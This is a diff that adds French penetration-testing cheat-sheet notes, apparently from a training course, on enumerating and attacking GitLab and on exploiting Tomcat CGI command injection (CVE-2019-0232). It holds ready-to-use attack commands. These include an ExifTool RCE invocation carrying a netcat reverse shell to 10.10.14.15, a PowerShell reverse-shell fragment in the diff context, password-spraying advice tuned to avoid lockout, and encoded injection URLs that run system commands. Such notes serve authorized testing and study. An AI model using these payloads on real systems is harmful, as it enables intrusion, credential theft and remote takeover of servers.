@@ -794,15 +794,138 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $
 - `curl -s http://<host>:8080/index.htm | grep prtgversion`
 - `crackmapexec smb <host> -u <user> -p <pass>`
 
-## Remarques courtes
-- L’exécution via Notifications est *aveugle* (pas de retour HTTP direct).  
-- Les paramètres peuvent contenir plusieurs commandes séparées par `;`.
+---
+
+# Customer Service Mgmt & Configuration Management
 
 ---
 
+# GitLab - Discovery & Enumeration
 
+## Objectif
+Méthodo concise pour détecter et énumérer une instance GitLab (footprint → accès public → collecte d’infos).
 
+## Étapes
 
+- **Identifier l’instance**
+  - Ouvrir l’URL GitLab → la page de login (logo / UI) confirme GitLab.
 
+- **Vérifier visibilité publique**
+  - Accéder à `/explore` pour lister projets publics, groupes et snippets.
+  - Parcourir les projets publics à la recherche de README, commits, fichiers de config, clés ou secrets exposés.
 
+- **Rechercher artefacts utiles**
+  - Inspecter fichiers de projet (`README`, `*.yml`, `Dockerfile`, `docker-compose`, `config`, scripts CI/CD`) pour secrets hard-codés.
+  - Examiner messages de commit et branches pour indices d’infra ou credentials (tokens, URLs internes).
 
+- **Tester inscription / comptes**
+  - Vérifier si l’auto-inscription est activée (self-signup).
+  - Si possible, créer un compte pour augmenter le niveau d’accès (respecter la portée du test).
+
+- **Énumération d’utilisateurs**
+  - Utiliser le formulaire d’inscription / validation d’email pour détecter utilisateurs existants (ex. : message `Email has already been taken` ou `Username is already taken`).
+  - Construire une liste d’utilisateurs valides depuis ce mécanisme.
+
+- **Récupération de version**
+  - La version GitLab est visible sur `/help` (nécessite d’être connecté).
+  - Si impossible d’y accéder, éviter les exploits aveugles — rester sur collecte passive.
+
+- **Rechercher dépôts internes accessibles**
+  - Après inscription/connexion, revisiter `/explore`, groups et projets privés accessibles.
+  - Télécharger / parcourir le code à la recherche de secrets, clés SSH, tokens CI/CD, fichiers de config.
+
+- **CI/CD & variables**
+  - Rechercher pipelines, jobs CI, runners et variables CI (tokens, credentials exposés dans fichiers `.gitlab-ci.yml` ou logs).
+
+- **Flux d’emails & confirmations**
+  - Si l’organisation permet l’utilisation d’e-mails temporaires liés aux tickets/services, essayer d’obtenir confirmations via la boîte support si pertinent.
+
+- **Réutilisation de credentials**
+  - Rassembler identifiants trouvés via OSINT/dumps et tester leur réutilisation sur GitLab (avec autorisation et précautions).
+
+---
+
+# GitLab - Attacking (cheat-sheet)
+
+## Objectif
+Actions concises pour passer de l'énumération à l'exploitation (RCE) quand possible.
+
+## 1) Prérequis rapides
+- Authentification requise pour certaines failles (ex : ExifTool RCE).
+- S'assurer de l'autorisation avant toute action intrusive.
+
+## 2) Username enumeration
+- Script (exemple) : `gitlab_userenum.sh`
+- Exemple d'utilisation :
+  - `./gitlab_userenum.sh --url http://gitlab.example.local:8081/ --userlist users.txt`
+
+## 3) Lockout / brute-force — paramètres par défaut
+- Valeurs par défaut (si non modifiées) :
+  - `config.maximum_attempts = 10`
+  - `config.unlock_in = 10.minutes`
+- Contrainte : adapter le rythme d'attaque (password-spraying) pour éviter le verrouillage.
+
+## 4) Exploit notable : ExifTool RCE (GitLab CE ≤ 13.10.2)
+- Type : Authenticated RCE via traitement d'images (ExifTool).
+- Prérequis : compte valide (ou self-register si activé) + version vulnérable.
+- Exemple d'exploit (PoC) :
+  - `python3 gitlab_13_10_2_rce.py -t http://gitlab.example.local:8081 -u user -p pass -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'`
+- Effet : exécution de commande → shell (souvent en tant qu'utilisateur `git`).
+
+## 5) Post-exploitation rapide
+- Shell obtenu souvent sous l'utilisateur `git` (vérifier `id`).
+- Rechercher : `config.toml`, clés SSH, tokens, fichiers CI/CD, accès runners.
+- Priorité : collecter secrets / accès CI pour pivoter.
+
+## Ressources (scripts mentionnés)
+- [User enum python3](https://github.com/dpgg101/GitLabUserEnum)
+- [User enum bash](https://www.exploit-db.com/exploits/49821)
+- [RCE POC](https://www.exploit-db.com/exploits/49951)
+
+---
+
+# Common Gateway Interfaces
+
+---
+
+# Attacking Tomcat CGI
+
+## CVE
+- CVE-2019-0232 — injection de commandes via le CGI Servlet lorsque `enableCmdLineArguments=true` (Windows; versions affectées : 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93).
+
+## Quick facts
+- Cible : Tomcat sous Windows avec CGI activé + `enableCmdLineArguments=true`.
+- Cause : la query string devient des arguments ligne de commande sans validation → possibilité d'injecter des commandes avec `&`.
+- Emplacement typique des scripts CGI : `/cgi/<script>.bat` ou `/cgi/<script>.cmd`.
+
+## Ports / identification
+- Tomcat HTTP : `8080` (souvent)
+- Découverte : `nmap -p- -sC -Pn <host> --open`
+
+## Recon / trouver les scripts CGI
+- Fuzzer les noms/extensions courants :
+  - `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<host>:8080/cgi/FUZZ.bat`
+  - tester aussi `.cmd`, `.exe`, `.ps1`
+- URL typique trouvée : `http://<host>:8080/cgi/welcome.bat`
+
+## Vérifier la vuln (rapide)
+- Injection basique (peut nécessiter encodage URL) :  
+  - `http://<host>:8080/cgi/welcome.bat?&dir` → sortie de `dir`
+- Lister variables d'environnement :  
+  - `http://<host>:8080/cgi/welcome.bat?&set` → montre `SCRIPT_FILENAME`, `COMSPEC`, `PATH`, etc.
+
+## Exécution sur Windows
+- `PATH` souvent non défini → utiliser chemins complets : `c:\windows\system32\whoami.exe`
+- Tomcat filtre certains caractères ; contourner par encodage URL :
+  - `:` → `%3A` ; `\` → `%5C`
+  - Exemple encodé : `http://<host>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
+
+## Schémas d'exploitation courants
+- Séparateur de commandes : ajouter `&<commande>` (ou version URL-encodée).
+  - Exemple : `http://<host>:8080/cgi/welcome.bat?&dir`
+  - Exemple encodé : `http://<host>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
+- Si exécution directe bloquée : écrire un fichier via redirection (`echo`) puis l'exécuter (tout en URL-encodant).
+
+## Resources
+- [ffuf](https://github.com/ffuf/ffuf)  
+- [nmap](https://nmap.org)  
